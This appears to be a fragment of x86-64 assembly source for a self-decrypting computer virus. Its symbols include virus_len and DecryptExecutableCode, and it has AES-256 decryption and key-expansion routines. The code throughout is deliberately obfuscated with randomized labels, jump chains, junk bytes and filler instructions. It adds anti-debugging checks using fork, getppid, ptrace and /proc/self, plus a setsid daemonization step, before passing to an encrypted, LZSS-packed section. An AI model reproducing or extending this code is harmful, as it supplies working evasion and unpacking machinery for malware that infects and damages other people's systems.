    movdqu      xmm1, OWORD [rsp+0xb0]
    aesdec      xmm0, xmm1
    mjmp        ..@6BZ92E1AgW5R
..@xBVq86SkfB0Z:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jz          ..@UfLrGZn9mWJ6
%endif
%endif
    mjmp        ..@hSh3kNOroFQR
db 0xe6, 0xf1, 0x4c
..@hSh3kNOroFQR:
    mjmp        ..@Gkbsma1Ec37a
..@t2ynXkvyvwUG:
    pslldq      xmm4, 0x4
    pxor        xmm1, xmm4
    push        rdx
    pop         rdx
    pxor        xmm1, xmm2
    mjmp        ..@oNTs0H4wAieQ
..@YlHiRNsiUiGD:
    movdqu      xmm3, [rdi+0x10]
    mjmp        ..@pAivVVj34NuA
db 0x6b, 0x94
..@pAivVVj34NuA:
    mjmp        ..@yWir1nesCwj0
..@hZUTeFoNCi8A:
    rep         nop
    movdqu      OWORD [r1+0x10], xmm1
    pop         r3
    ret
    mjmp        ..@FZ77sAeVwiEn
db 0x05, 0x24
..@FZ77sAeVwiEn:
    mjmp        ..@fKQaPzxvBcSE
db 0xff
..@fKQaPzxvBcSE:
    mjmp        ..@1iTrq5MnoYag
db 0x38, 0x78, 0x1d
..@1iTrq5MnoYag:
    mjmp        Aes256KeyExpansion
..@2Y5hIdVIjmke:
    pop         r3
    pop         r2
    mjmp        ..@K0olDD8A7qNm
..@kPULsqfTbayC:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jnz         ..@wZNvHHi0lCbA
%endif
%endif
    mjmp        ..@HJ4Y5GY8pI6t
db 0xa4, 0xba
..@HJ4Y5GY8pI6t:
    mjmp        ..@fM6z6Qbcb9SK
..@2yiyBvM87sFX:
    push        rbx
    pop         rbx
    mjmp        ..@WrcT4qYyseoA
db 0x26
..@WrcT4qYyseoA:
    mjmp        ..@lsSjxRdCY05v
db 0xd4, 0xe7, 0x8b
..@lsSjxRdCY05v:
    mjmp        ..@fNsnEb1hUZEy
..@SF3ZLDB7lTzC:
    mxor        rax, rax
    mjmp        ..@TfV2HNzZfeic
..@jI6Rvg1yGC4B:
    movr        rax, rax
    mov         r2d, DWORD [r5]
    msub        r2, non_encrypted_len
    and         r2, 0xfffffffffffffff0
    lea         r3, [rsp+_UEC_OFF.key]
    mjmp        ..@LLHNIfRTyo5p
..@LTEhi6VQsjxj:
    ret
    mjmp        ..@08VUFySs49uP
..@rTQztxf1RH4p:
    pslldq      xmm4, 0x4
    mjmp        ..@LLzm84B8BUJy
..@Q10Y7PTs3cm0:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rdi, rdi
%endif
%endif
    mjmp        ..@H7KJqSysPHbO
db 0x49, 0x35, 0x34
..@H7KJqSysPHbO:
    mjmp        ..@5jX2mfz4eKRV
..@15IUvYGCRFRM:
    movr        rax, rax
    mjmp        ..@gxQPEp821RjB
db 0x47, 0xb2
..@gxQPEp821RjB:
    mjmp        ..@WHYEk4xorQlR
db 0x14, 0x5a
..@WHYEk4xorQlR:
    mjmp        ..@2Y5hIdVIjmke
..@WAAKeQsgiX6o:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rbx
    pop         rbx
    movr        r1, rax
    xchg        rdi, rdi
%endif
%endif
    mjmp        ..@PAGMXVs1d2KH
..@TXnpzV5EcQK3:
%ifndef ENABLE_DEBUGGING
    cmp         WORD [rax], 0x0a30
%endif
    mjmp        ..@VZ3dKjzsbadO
db 0x04, 0x7b, 0xb6
..@VZ3dKjzsbadO:
    mjmp        ..@zmppGPL25drZ
db 0xd0
..@zmppGPL25drZ:
    mjmp        ..@3jSHInZjny7K
..@lHtvB2H7PkyU:
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp]
    aesdeclast  xmm0, xmm1
    movdqu      [rsi+rcx], xmm0
    madd        rcx, 0x10
    mjmp        ..@2Txcdvyh6kyR
db 0x32, 0x10, 0x52
..@2Txcdvyh6kyR:
    mjmp        ..@XHe3RnhyXJ5d
db 0x55, 0x3f, 0x5e
..@XHe3RnhyXJ5d:
    mjmp        ..@s3qfDEJzTQBd
..@ZX4qHeiD00oa:
    mov         QWORD [rsp+_AESD_OFF.length], r2
    mov         QWORD [rsp+_AESD_OFF.keyaddr], r3
    movr        rsi, rsp
    mjmp        ..@jxJWabblHLpI
..@DJEBcHwmJ7De:
    pop         rcx
    mjmp        ..@29sO6drfylH9
db 0x97, 0x49
..@29sO6drfylH9:
    mjmp        ..@wZNvHHi0lCbA
..@BKNetI8fVbQq:
    pop         rbx
    mjmp        ..@jI6Rvg1yGC4B
..@tLkQ7eAM4cxf:
    aesimc      xmm0,xmm1
    push        rcx
    pop         rcx
    movdqu      OWORD [rsp+0x30],xmm0
    mjmp        ..@C3JsNprKT7hp
db 0x66, 0xd7, 0xa4
..@C3JsNprKT7hp:
    mjmp        ..@qq9ggk0lxFFO
..@f7j2NkLKhwdZ:
    call        ..@08VUFySs49uP
    movdqa      OWORD [rsi+0xe0], xmm1
    mjmp        ..@LTEhi6VQsjxj
..@3eQeEOosktro:
    mxor        rax, rax
    movv        rax, SYS_FORK
    syscall
    cmp         eax, 0x0
    mjmp        ..@Q0fM9MkTXd64
db 0xff
..@Q0fM9MkTXd64:
    mjmp        ..@kxLjuAbu8hPL
db 0xc7
..@kxLjuAbu8hPL:
    mjmp        ..@OxnUCmRDPrrb
..@tCjAKwoETBAi:
%ifndef ENABLE_DEBUGGING
    movv        rax, SYS_WRITE
    syscall
%endif
    mjmp        ..@7CmqIUQmysln
db 0x51, 0xe2, 0x19
..@7CmqIUQmysln:
    mjmp        ..@zH5eDqvMf9ua
db 0x97, 0xc6
..@zH5eDqvMf9ua:
    mjmp        ..@6lXNFy7Dosyg
db 0x87, 0x45
..@6lXNFy7Dosyg:
    mjmp        ..@SsgE2IMRJRFD
..@dYUtoQlKB03c:
    movdqa      OWORD [rsi+0x20], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@Rq8nu8RlAPYf
    movdqa      OWORD [rsi+0x30], xmm3
    mjmp        ..@5qXmtb7mlloP
db 0xf9
..@5qXmtb7mlloP:
    mjmp        ..@OtLqbZ3a6kR5
..@Mi7VCmArUXAh:
    call        ..@Rq8nu8RlAPYf
    mjmp        ..@NDSxcfbvg149
db 0xb6, 0xd9
..@NDSxcfbvg149:
    mjmp        ..@7BZC2uzt4d6d
db 0xc4, 0x08
..@7BZC2uzt4d6d:
    mjmp        ..@uIChtuAJhJZ0
..@OtLqbZ3a6kR5:
    push        rcx
    mjmp        ..@FFKrWGkzaxIi
db 0x58, 0xed
..@FFKrWGkzaxIi:
    mjmp        ..@V4xiyhgbDAS1
..@Kg70sFPDhY5O:
    msub        rdi, 0x5
    INIT_MX_VAR
    mjmp        ..@H4Wh8p4aKWIT
..@7UXxlv5sOy5X:
    movdqu      xmm1, OWORD [rsp+0xc0]
    mjmp        ..@5gri7wxcGtVt
..@x4W2wjZb7PNJ:
    pop         rax
    aesimc      xmm0,xmm1
    push        rdi
    mjmp        ..@yM0RtCNvceEK
..@WXvJagBY12kI:
    movdqu      xmm2, OWORD [r2+rax]
    movdqu      xmm3, OWORD [r2+rax+0x10]
    pxor        xmm0, xmm2
    pxor        xmm1, xmm3
    mjmp        ..@94kn2sx4bPYC
db 0xd7, 0x1f
..@94kn2sx4bPYC:
    mjmp        ..@Ya5x0I9Wn5nN
Aes256KeyExpansion:
    mjmp        ..@tRHrqjqVIIwu
..@Je42tdtTTuzP:
    movdqu      xmm1, OWORD [rsp+0x40]
    aesdec      xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0x30]
    mjmp        ..@paQUskqMBwBO
..@PItQDLGer1So:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
    movr        r1, r5
    call        GetEnv
%endif
    mjmp        ..@iJ9aukDGeRjd
db 0x8c, 0x0a, 0x02
..@iJ9aukDGeRjd:
    mjmp        ..@TxlT0PIYxLQU
db 0xea
..@TxlT0PIYxLQU:
    mjmp        ..@Ml19j6T8PLWa
..@yvekHlCiM62g:
    pxor        xmm1, xmm4
    mjmp        ..@t2ynXkvyvwUG
..@umzgGIkhO3Ye:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r2, rax
    mxor        r3, r3
    movr        rsp, rsp
    mxor        r4, r4
    xchg        rsi, rsi
%endif
%endif
    mjmp        ..@T9MkOI4wYmmF
..@jSmZuvWRWEfH:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r4, r4
%endif
%endif
    mjmp        ..@dCLFlfvEVMQk
db 0x39
..@dCLFlfvEVMQk:
    mjmp        ..@zDaH1q17VDzh
db 0x5e
..@zDaH1q17VDzh:
    mjmp        ..@sOGGj7QfypAt
..@rO6rwtgcpCfu:
    movr        r4, r5
    xchg        rsi, rsi
    sub         r4, r1
    mjmp        ..@VeucBZSPrGlI
..@Ya5x0I9Wn5nN:
    madd        rax, 0x20
    mjmp        ..@lcEcwPMUzPRz
..@mqbBgQnt2EnZ:
    movr        rcx, rcx
    mjmp        ..@utJ6viSgX1rD
..@OvPRX9Pasxae:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_FORK
    syscall
    cmp         eax, 0x0
%endif
%endif
    mjmp        ..@UBEUVO1mFzIC
db 0xd4
..@UBEUVO1mFzIC:
    mjmp        ..@cZiGu7l4e419
..@VjhctNyKm15E:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    syscall
%endif
%endif
    mjmp        ..@cWAIHqOKYPv4
..@vtXbPc0olFYr:
    xchg        rdx, rdx
    mjmp        ..@Zs3Yyuc1hKJL
..@FK7N98AFXc9R:
    pop         r1
    mjmp        ..@hLJSVslIYHqY
db 0xe3
..@hLJSVslIYHqY:
    mjmp        ..@xdl2AvbyEwqn
..@aDU5DLIdyL3n:
    movr        rax, r1
    mxor        r1, r1
    mxor        r2, r2
    mxor        r3, r3
    mjmp        ..@NmrXLYA4OzlT
db 0x4f, 0x70
..@NmrXLYA4OzlT:
    mjmp        ..@A3BTNpLi1iwn
..@u7Rk0uUcunKJ:
    aesimc      xmm0,xmm1
    mjmp        ..@nZYllOYMc58s
db 0xe2, 0xd0, 0xec
..@nZYllOYMc58s:
    mjmp        ..@dsJxmdxB2FH5
db 0x2a, 0x18
..@dsJxmdxB2FH5:
    mjmp        ..@SKfSJSMSd6FR
..@E8kUtuPhH8yV:
    mov         rdx, QWORD [rsp]
    mjmp        ..@8vT1WbvLCHHQ
..@tWqhOrztnopZ:
    pop         rdx
    mjmp        ..@9OH9l0a16MmT
db 0xb0
..@9OH9l0a16MmT:
    mjmp        ..@vOaduJgeLu9A
..@M4oQbJfW9Thf:
    movdqa      OWORD [rsi+0x80], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    rep         nop
    call        ..@Rq8nu8RlAPYf
    mjmp        ..@hkOKDP8VndjU
..@GtdIwhvJN0oX:
    aeskeygenassist xmm2, xmm3, 0x20
    mjmp        ..@ZBTW3X87AmLc
db 0x59, 0x47, 0xf6
..@ZBTW3X87AmLc:
    mjmp        ..@mxNEUXvOn54f
..@oNTs0H4wAieQ:
    ret
    mjmp        ..@Rq8nu8RlAPYf
..@jxJWabblHLpI:
    push        rax
    mjmp        ..@EB6SfMUjiVqH
db 0x67, 0xe5
..@EB6SfMUjiVqH:
    mjmp        ..@O1cDfMRJr8up
db 0x0f
..@O1cDfMRJr8up:
    mjmp        ..@Trj80ipZFtPU
..@SCxAj3z7qT34:
    mxor        rax, rax
    movv        rax, SYS_SETSID
    syscall
    mxor        rax, rax
    movv        rax, SYS_FORK
    mjmp        ..@7yOi0izQtxZa
..@fNsnEb1hUZEy:
    movdqu      xmm1, OWORD [rsp+0x70]
    mjmp        ..@2PGLiEJkC1iO
..@6n6OHYrlJRgn:
    GGLOBAL     _packed
    mov         m8, r5 
    call        Processes
    mxor        r1, r1
    call        ExitProgram
    mjmp        ..@y37ZE6MbM5R0
..@TXUiBKKER7PF:
    push        rax
    pop         rax
    msub        rdi, 1
    mjmp        ..@Kg70sFPDhY5O
..@FosF3SR1InAw:
    mov         rcx, QWORD [rsp]
    cmp         QWORD [rsp+2*bytes], rcx
    push        rcx
    movr        rbx, rbx
    pop         rcx
    mjmp        ..@ebeYHvdgqQN8
db 0x5f, 0xb9
..@ebeYHvdgqQN8:
    mjmp        ..@ssZJTn5APwab
db 0xb0, 0x82, 0x12
..@ssZJTn5APwab:
    mjmp        ..@qNlHG0wztd8w
..@EHnNT85bsKc6:
    and         r1, ~(PAGE_SIZE-1)
    mjmp        ..@rO6rwtgcpCfu
..@BMnca8veqWGa:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    jle         ..@WAAKeQsgiX6o
    xchg        rbx, rbx
    movr        rax, rax
    movv        rax, SYS_GETPPID
    syscall
%endif
%endif
    mjmp        ..@kTqnqGe533lE
db 0x4f
..@kTqnqGe533lE:
    mjmp        ..@cWvNYWVoDiId
db 0x93, 0x8a, 0x50
..@cWvNYWVoDiId:
    mjmp        ..@3KeS6uhhWQbg
..@0WhpzkrXMzFk:
    rep         nop
    mjmp        ..@gZYWBfvGdHye
..@I87h0JGbFHre:
    call        Strncmp
    mjmp        ..@w70koHRZu9Fi
db 0xd0, 0x9b, 0x03
..@w70koHRZu9Fi:
    mjmp        ..@QzCl1xSj23Tg
db 0xb5
..@QzCl1xSj23Tg:
    mjmp        ..@eNwv6TSitm7y
..@e7u8RV2f0CO7:
    movv        rax, SYS_EXIT
    mjmp        ..@SbIoxSIDJ7Le
db 0xcd
..@SbIoxSIDJ7Le:
    mjmp        ..@3shQqczN9mtr
db 0x94, 0x17, 0x3d
..@3shQqczN9mtr:
    mjmp        ..@65rPG8Ubm6E3
db 0x32, 0x78, 0x47
..@65rPG8Ubm6E3:
    mjmp        ..@oJvLR7PkNmcR
..@2PGLiEJkC1iO:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x70],xmm0
    movdqu      xmm1, OWORD [rsp+0x80]
    xchg        rax, rax
    push        rax
    mjmp        ..@x4W2wjZb7PNJ
..@dM3QgyHV989e:
    xchg        rax, rax
    mjmp        ..@maItQzgJZcsx
..@s3qfDEJzTQBd:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jl          ..@AYrne4FiOJIq
    madd        rsp, _AESD_OFF_size+0x100
    leave
    mjmp        ..@Soc7p2cZJTUV
..@vcu8UHbxPHRV:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    mjmp        ..@Ugfu9kukvwZn
db 0x48
..@Ugfu9kukvwZn:
    mjmp        ..@xVTj0dUlgMW0
db 0xec, 0xd9
..@xVTj0dUlgMW0:
    mjmp        ..@jUK7pe4kYlwm
..@bDMkDPNZGgPs:
    call        ..@08VUFySs49uP
    movdqa      OWORD [rsi+0x40], xmm1
    aeskeygenassist xmm2, xmm1, 0x0
    call        ..@Rq8nu8RlAPYf
    movdqa      OWORD [rsi+0x50], xmm3
    mjmp        ..@DRSJBrOgvKMr
..@7TvDB7dJdS7F:
    movdqu      xmm1, OWORD [rsp+0xe0]
    pxor        xmm0, xmm1
    movdqu      xmm1, OWORD [rsp+0xd0]
    aesdec      xmm0, xmm1
    mjmp        ..@XKxtdFhh3rfr
..@LLzm84B8BUJy:
    pxor        xmm3, xmm4
    pslldq      xmm4, 0x4
    movr        rdx, rdx
    rep         nop
    pxor        xmm3, xmm4
    mjmp        ..@vU7VrbAOjGWG
db 0xc3, 0xbe, 0x87
..@vU7VrbAOjGWG:
    mjmp        ..@PtDAcFpRgDQX
..@V7gU8U4pPLLx:
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    mjmp        ..@Cr3dAuk2heyH
db 0x6f
..@Cr3dAuk2heyH:
    mjmp        ..@QyrWPST42dB2
db 0x29, 0xa3, 0xb1
..@QyrWPST42dB2:
    mjmp        ..@wujCEWUhLDpL
..@z3QCBsDm3XXH:
    call        ..@Rq8nu8RlAPYf
    movdqa      OWORD [rsi+0x70], xmm3
    movr        rbp, rbp
    mjmp        ..@wsoDWE3jfV1q
..@mH7DC4dze3RX:
    movdqu      xmm1, OWORD [rsp+0x10]
    mjmp        ..@lHtvB2H7PkyU
..@A3BTNpLi1iwn:
    mxor        r4, r4
    mxor        r5, r5
    jmp         rax
    push        rdi
    pop         rdi
    mjmp        ..@0RAFUUcBNi8k
db 0x52, 0x25, 0xb7
..@0RAFUUcBNi8k:
    mjmp        ..@jUTdOERxQt2d
..@08VUFySs49uP:
    pshufd      xmm2, xmm2, 0xff
    mjmp        ..@yWQuLhi8QX1J
db 0xc0, 0xff, 0xda
..@yWQuLhi8QX1J:
    mjmp        ..@ScuKKp1KvVm8
..@wZNvHHi0lCbA:
%ifndef ENABLE_DEBUGGING
    mxor        rax, rax
    movv        r3, debugging_size
    VAR         public, debugging
    movr        r2, r5
    movv        r1, 0x1
%endif
    mjmp        ..@tCjAKwoETBAi
..@sD5Bdjwbm38y:
    push        rdi
    mjmp        ..@7VZRYzRasWHm
..@zEygVWelPI3J:
    pop         rax
    mjmp        ..@RY2xyvRPA6My
db 0x9b, 0x9a
..@RY2xyvRPA6My:
    mjmp        ..@xwcKuPseMFsq
..@BCmnoz7fU9iz:
    movdqu      xmm1, OWORD [rsp+0xb0]
    push        rax
    pop         rax
    mjmp        ..@aMOKEiGzaggX
db 0x77, 0xd0, 0x5b
..@aMOKEiGzaggX:
    mjmp        ..@eImZEhy0Epna
db 0x1b
..@eImZEhy0Epna:
    mjmp        ..@AgRMMfLwL2RR
db 0x44, 0x07, 0xf5
..@AgRMMfLwL2RR:
    mjmp        ..@u7Rk0uUcunKJ
..@Qc4Srp0OKMfs:
    mxor        r4, r4
    movv        rax, SYS_WAIT4
    syscall
    madd        rsp, bytes
    mjmp        ..@NCODo1aguulo
..@AhHhpqMLZ1vT:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rsp, rsp
    xchg        rdx, rdx
    mxor        r2, r2
%endif
%endif
    mjmp        ..@Ptl9sqOSKYkb
..@utJ6viSgX1rD:
    movr        r1, rax
    mxor        r2, r2
    mxor        r3, r3
    mjmp        ..@Qc4Srp0OKMfs
..@xxtKIPvvA8Qv:
%ifndef ENABLE_DEBUGGING
    xchg        rax, rax
    call        GetEnv
    test        rax, rax
%endif
    mjmp        ..@lgAvxVzZx29y
..@cWAIHqOKYPv4:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movr        r1, rax
%endif
%endif
    mjmp        ..@NZSQC2nuRQ3I
db 0xbe, 0x45
..@NZSQC2nuRQ3I:
    mjmp        ..@AhHhpqMLZ1vT
GetEnv:
    mjmp        ..@Zqlfe8RM3h3j
..@PIlqgwU6i4DX:
    GGLOBAL     virus_len
    cmp         DWORD [r5], 0x00000000
    jne         ..@y37ZE6MbM5R0
    mjmp        ..@6n6OHYrlJRgn
..@F2DUAAzJ3QIX:
    mxor        rbx, rbx
    mjmp        ..@eEKnAxtcLBU5
db 0x01
..@eEKnAxtcLBU5:
    mjmp        ..@u4RXP53e7E6I
..@GbONClmReSMG:
    call        Strlen
    mjmp        ..@twFJGxtpleUP
..@PAGMXVs1d2KH:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    call        ExitProgram
%endif
%endif
    mjmp        ..@BeTUHRFbsnj8
db 0x71, 0x74, 0xcf
..@BeTUHRFbsnj8:
    mjmp        ..@SCxAj3z7qT34
..@EvgH3DwJTbvU:
    movr        r2, r5
    movv        r3, keycreation_len
    call        Aes256KeyCreation
    mjmp        ..@oETkLAuFhfac
..@Y6qNkanDou1I:
    mjmp        ..@Z8BwcqUkMIV9
    mjmp        ..@Vxqvm7b3iWl3
..@GbukNFIDlpc2:
    madd        rax, 1
    mjmp        ..@HEuT3b0NjTH6
db 0x5c, 0x76
..@HEuT3b0NjTH6:
    mjmp        ..@Y6qNkanDou1I
..@Ml19j6T8PLWa:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
    jnz         ..@wZNvHHi0lCbA
%endif
    mjmp        ..@LD7DxIUZhBAu
db 0x05, 0x5c
..@LD7DxIUZhBAu:
    mjmp        ..@elDVkfHFAHM6
..@5jX2mfz4eKRV:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        rax, rax
%endif
%endif
    mjmp        ..@OvPRX9Pasxae
Strlen:
    mjmp        ..@9YolnnNljPaa
..@eBK91O6wqjC3:
    mxor         r2, r2
    mjmp        ..@0tAGp0YOFYlt
..@pOpVwtrDvNu4:
    madd        rdi, bytes
    cmp         QWORD [rdi], 0x00
    movr        rax, rax
    mjmp        ..@VlCINjAQ0dhu
db 0xe2, 0x0c, 0x09
..@VlCINjAQ0dhu:
    mjmp        ..@hxCRWD3JbroV
..@K0olDD8A7qNm:
    pop         r1
    mjmp        ..@ixFjfbYh9dNP
..@71wMYiDpzXjf:
%ifndef ENABLE_DEBUGGING
    movr        rbx, rbx
    msub        rsp, 0x1000
    VAR         public, procself
    xchg        rax, rax
    OFILE       [r5], 0x0
%endif
    mjmp        ..@67zqqPcvvFsA
..@M9vuWowgTENI:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r4, r4
    movv        rax, SYS_WAIT4
    push        rdi
%endif
%endif
    mjmp        ..@4ibdjX46OnGH
..@Ptl9sqOSKYkb:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r3, r3
    movr        rdx, rdx
%endif
%endif
    mjmp        ..@M9vuWowgTENI
..@y37ZE6MbM5R0:
    msub        rsp, _UEC_OFF_size
    mjmp        ..@sD5Bdjwbm38y
..@UT8qC2D7vigI:
    movdqu      xmm1, OWORD [rsp+0x50]
    aesdec      xmm0, xmm1
    mjmp        ..@mGMW15NsAyU0
db 0x7c, 0x11
..@mGMW15NsAyU0:
    mjmp        ..@Je42tdtTTuzP
..@NSBsgkzAS6JN:
    pop         rdi
    mjmp        ..@7aOSpmkTDCP0
db 0x23, 0x67, 0xbb
..@7aOSpmkTDCP0:
    mjmp        ..@jfBe3gpYYugP
db 0x91, 0xbb
..@jfBe3gpYYugP:
    mjmp        ..@TXUiBKKER7PF
Memmem:
    mjmp        ..@xQyiEnI7Aqk4
..@5cC5u9J84xO6:
    movr        r1, r5
    GGLOBAL     virus_len
    push        rbx
    mjmp        ..@BKNetI8fVbQq
..@ixFjfbYh9dNP:
    ret
    mjmp        GetEnv
..@3k2bWnoFZAYf:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    movv        rax, SYS_GETPPID
%endif
%endif
    mjmp        ..@VjhctNyKm15E
..@29LCpxaGni2f:
    pxor        xmm3, xmm4
    mjmp        ..@rTQztxf1RH4p
..@OxnUCmRDPrrb:
    jl          ..@mqbBgQnt2EnZ
    mjmp        ..@HFqPZas7Cx9k
db 0x54, 0x54
..@HFqPZas7Cx9k:
    mjmp        ..@DeTvXJioj7hH
..@rdMwEvwTjogk:
    jz          ..@u4RXP53e7E6I
    mjmp        ..@E8kUtuPhH8yV
..@jUK7pe4kYlwm:
    movdqu      xmm1, OWORD [rsp+0x10]
    aesimc      xmm0,xmm1
    mjmp        ..@wHTgBDZ5lMCu
db 0xd1, 0x58
..@wHTgBDZ5lMCu:
    mjmp        ..@7DHUSjzADHH0
..@qLLubBT28AVy:
    movr        rax, r2
    mjmp        ..@FK7N98AFXc9R
..@0X8EozsQKmJO:
    mjmp        ..@lukobnVpPuCb
    mjmp        ..@gmi5JcEZKstl
db 0x4a, 0x4a
..@gmi5JcEZKstl:
    mjmp        ..@Fl68YB773tQN
..@Soc7p2cZJTUV:
    ret
    mjmp        ..@4gNBOJccG8B3
db 0xc6, 0x43
..@4gNBOJccG8B3:
    mjmp        ..@jjDOikhlMvqS
db 0x90, 0xc4
..@jjDOikhlMvqS:
    mjmp        ..@EVJcovC21N5n
db 0xbc, 0x50
..@EVJcovC21N5n:
    mjmp        DecryptExecutableCode
..@e2JjPg0O0ypt:
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xa0],xmm0
    mjmp        ..@BCmnoz7fU9iz
..@twFJGxtpleUP:
    movr        r3, rax
    xchg        rdx, rdx
    mov         r4, m4
    mjmp        ..@xBpOxGa2cR4L
db 0x3d, 0x50
..@xBpOxGa2cR4L:
    mjmp        ..@lukobnVpPuCb
..@UfLrGZn9mWJ6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    push        rsi
    push        rax
    pop         rax
%endif
%endif
    mjmp        ..@XIkqhy29bL0r
..@VeucBZSPrGlI:
    GGLOBAL     virus_len
    xchg        rsp, rsp
    mov         r2d, DWORD [r5]
    add         r2, r4
    mjmp        ..@6bQ9XYgnGyxA
db 0xd1
..@6bQ9XYgnGyxA:
    mjmp        ..@6iXIkPru0Yv9
db 0x30, 0xe2
..@6iXIkPru0Yv9:
    mjmp        ..@MotC8UGysKpo
..@V4xiyhgbDAS1:
    movr        rdx, rdx
    pop         rcx
    aeskeygenassist xmm2, xmm3, 0x2
    mjmp        ..@XzQcl9MZWcw0
db 0xa8, 0xf5
..@XzQcl9MZWcw0:
    mjmp        ..@bDMkDPNZGgPs
..@vrPXuW6V53VR:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    mxor        r3, r3
%endif
%endif
    mjmp        ..@WarKqGj8hEuB
db 0x4e, 0x58
..@WarKqGj8hEuB:
    mjmp        ..@jSmZuvWRWEfH
..@7DHUSjzADHH0:
    movdqu      OWORD [rsp+0x10],xmm0
    movdqu      xmm1, OWORD [rsp+0x20]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0x20],xmm0
    movdqu      xmm1, OWORD [rsp+0x30]
    mjmp        ..@tLkQ7eAM4cxf
..@wujCEWUhLDpL:
    call        Aes256KeyExpansion
    mxor        rcx, rcx
    mjmp        ..@xqmpYoVAkm5s
db 0xd8
..@xqmpYoVAkm5s:
    mjmp        ..@vcu8UHbxPHRV
..@vOaduJgeLu9A:
    ret
    mjmp        Memmem
Aes256Decryption:
    mjmp        ..@Bgk52A4RgB1h
..@5iAgxDQLQPDC:
    movdqu      xmm1, OWORD [r1+0x10]
    mxor        rax, rax
    mjmp        ..@Ya5x0I9Wn5nN
    mjmp        ..@nWIkEFnMFyNw
db 0x0b, 0x41
..@nWIkEFnMFyNw:
    mjmp        ..@Z655NtexA94j
db 0x9c, 0x07
..@Z655NtexA94j:
    mjmp        ..@vzD8mXOlsI3Z
db 0x40, 0x8b, 0xdc
..@vzD8mXOlsI3Z:
    mjmp        ..@WXvJagBY12kI
..@Zqlfe8RM3h3j:
    push        r1
    mjmp        ..@GbOIanzmbLOP
db 0x9c
..@GbOIanzmbLOP:
    mjmp        ..@GbONClmReSMG
..@QR3nUbRving6:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    xchg        rdx, rdx
    push        rsi
    pop         rsi
%endif
%endif
    mjmp        ..@tzUuzjuj2fyg
db 0xe5, 0x72
..@tzUuzjuj2fyg:
    mjmp        ..@3k2bWnoFZAYf
DecryptExecutableCode:
    mjmp        ..@PIlqgwU6i4DX
..@bejvAUUWbNQ7:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    cmp         rax, 0x00
%endif
%endif
    mjmp        ..@T8PUQn1b8GhF
db 0x8a, 0xad, 0x92
..@T8PUQn1b8GhF:
    mjmp        ..@BMnca8veqWGa
..@SKfSJSMSd6FR:
    movdqu      OWORD [rsp+0xb0],xmm0
    movdqu      xmm1, OWORD [rsp+0xc0]
    aesimc      xmm0,xmm1
    movdqu      OWORD [rsp+0xc0],xmm0
    mjmp        ..@5K6aTmZOtz6t
..@7WfxFryDl9TY:
    movr        rsp, rsp
    mjmp        ..@YIVW6WN1xlQf
db 0x02
..@YIVW6WN1xlQf:
    mjmp        ..@Ot8FMUwvMYN7
db 0xdc, 0x73
..@Ot8FMUwvMYN7:
    mjmp        ..@5iQCDlDAVbnn
db 0xdd, 0xd2
..@5iQCDlDAVbnn:
    mjmp        ..@g3T2XOwtwHyI
db 0x49, 0xc0
..@g3T2XOwtwHyI:
    mjmp        ..@71wMYiDpzXjf
..@xdl2AvbyEwqn:
    ret
    mjmp        Aes256KeyCreation
..@U14t0XRMSqlx:
%ifndef ENABLE_DEBUGGING
%ifndef DISABLE_PTRACE
    test        eax, eax
%endif
%endif
    mjmp        ..@xBVq86SkfB0Z
..@KzLNsr7on085:
%ifndef ENABLE_DEBUGGING
    jnz         ..@wZNvHHi0lCbA
%endif
    mjmp        ..@9zyKAq2jAh3w
db 0x90, 0x38
..@9zyKAq2jAh3w:
    mjmp        ..@QQ4XhQi2JCXH
db 0x55, 0xcc
..@QQ4XhQi2JCXH:
    mjmp        ..@Q10Y7PTs3cm0
..@qq9ggk0lxFFO:
    movdqu      xmm1, OWORD [rsp+0x40]
    aesimc      xmm0,xmm1
    movr        rax, rax
    movdqu      OWORD [rsp+0x40],xmm0
    movdqu      xmm1, OWORD [rsp+0x50]
    mjmp        ..@7SEDBYN5aVv8
db 0xc1
..@7SEDBYN5aVv8:
    mjmp        ..@YzAwmzEE4u36
db 0x42, 0xb1
..@YzAwmzEE4u36:
    mjmp        ..@wCY7Rp8L8qlD
..@ubxZOgRktfvI:
    madd        r2, 1
    mjmp        ..@6HKcdrHi5acU
db 0x53
..@6HKcdrHi5acU:
    mjmp        ..@dM3QgyHV989e

;-----------------------------------------------------
; ENCRYPTED PART (The code below is encrypted but not 
; packed)
_decrypt:
;-----------------------------------------------------
; Encrypted Structures.
struc _LZSSD_OFF
    .buffer     resb WINDOW_LENGTH*2
